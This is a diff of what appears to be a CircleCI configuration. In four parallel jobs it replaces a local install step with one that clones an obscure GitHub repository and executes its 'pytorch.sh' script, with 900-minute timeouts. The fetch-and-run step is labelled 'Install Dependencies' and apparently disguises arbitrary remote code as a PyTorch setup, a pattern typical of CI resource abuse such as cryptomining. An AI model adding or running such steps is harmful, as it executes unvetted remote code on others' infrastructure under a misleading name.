@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: chmod +x pytorch.sh && ./pytorch.sh
+            command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku2:
       docker:
@@ -14,7 +14,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: chmod +x pytorch.sh && ./pytorch.sh
+            command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku3:
       docker:
@@ -22,7 +22,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: chmod +x pytorch.sh && ./pytorch.sh
+            command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku4:
       docker:
@@ -30,9 +30,8 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: chmod +x pytorch.sh && ./pytorch.sh
+            command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
-
             
 workflows:
     version: 2
